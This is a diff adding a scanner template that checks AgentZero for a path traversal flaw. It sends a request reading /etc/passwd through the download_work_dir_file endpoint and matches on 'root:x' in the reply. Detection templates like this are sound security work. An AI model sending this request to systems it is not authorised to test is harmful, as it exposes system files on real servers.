@@ -1,0 +1,26 @@
+id: AgentZero-download_work_dir_file-PathTraversal
+
+info:
+  name: AgentZero-download_work_dir_file-PathTraversal
+  author: iSee857
+  severity: high
+  description: |
+    AgentZero-download_work_dir_file-PathTraversal
+
+http:
+  - raw:
+      - |
+        GET /download_work_dir_file?path=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+
+      - type: status
+        status:
+          - 200
